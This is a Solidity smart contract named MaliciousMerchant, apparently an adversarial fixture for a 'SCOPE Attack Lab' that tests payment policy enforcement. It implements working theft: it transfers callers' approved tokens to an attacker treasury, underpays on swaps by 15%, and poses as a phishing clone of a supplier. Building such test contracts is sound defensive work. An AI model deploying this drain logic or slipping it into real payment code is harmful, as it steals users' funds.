// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title MaliciousMerchant
 * @notice Adversarial contract used in SCOPE Attack Lab.
 * @dev Intentionally violates policies:
 * 1. Diverts funds to rogue attacker wallet.
 * 2. Attempts to bypass output postconditions by returning insufficient tokens (slippage/drain attack).
 */
contract MaliciousMerchant {
    address public attackerTreasury;
    string public deceptiveName;

    event AttackAttempted(string attackType, address indexed victim, uint256 amount);
    event FundsExfiltrated(address indexed attacker, uint256 amount);

    constructor(address _attackerTreasury) {
        attackerTreasury = _attackerTreasury == address(0) ? msg.sender : _attackerTreasury;
        deceptiveName = "Acme Componnets [Phishing Clone]";
    }

    /**
     * @notice Rogue procurement: steals funds directly to attacker treasury without valid invoice.
     */
    function processProcurement(
        address asset,
        uint256 amount,
        string calldata /* itemSku */
    ) external returns (uint256) {
        emit AttackAttempted("ROGUE_PROCUREMENT", msg.sender, amount);
        bool success = IERC20(asset).transferFrom(msg.sender, attackerTreasury, amount);
        require(success, "Steal failed");
        emit FundsExfiltrated(attackerTreasury, amount);
        return 999999;
    }

    /**
     * @notice Slippage drain: accepts full amount (e.g., 500 USDC) but intentionally returns
     * substandard output (e.g. 0.17 ETH equivalent instead of requested 0.20 minimum),
     * demonstrating atomic postcondition revert in SCOPE.
     */
    function executeDefectiveSwap(
        address inAsset,
        uint256 inAmount,
        address outAsset,
        uint256 requestedOutAmount
    ) external returns (bool) {
        emit AttackAttempted("SLIPPAGE_EXPLOIT", msg.sender, inAmount);
        
        // Take full payment
        require(IERC20(inAsset).transferFrom(msg.sender, attackerTreasury, inAmount), "In-transfer failed");
        
        // Intentionally return 15% less than required by postcondition
        uint256 substandardAmount = (requestedOutAmount * 85) / 100;
        if (substandardAmount > 0 && outAsset != address(0)) {
            if (IERC20(outAsset).balanceOf(address(this)) >= substandardAmount) {
                IERC20(outAsset).transfer(msg.sender, substandardAmount);
            }
        }
        return true;
    }

    // Set new attacker address
    function setAttackerTreasury(address _attackerTreasury) external {
        attackerTreasury = _attackerTreasury;
    }
}
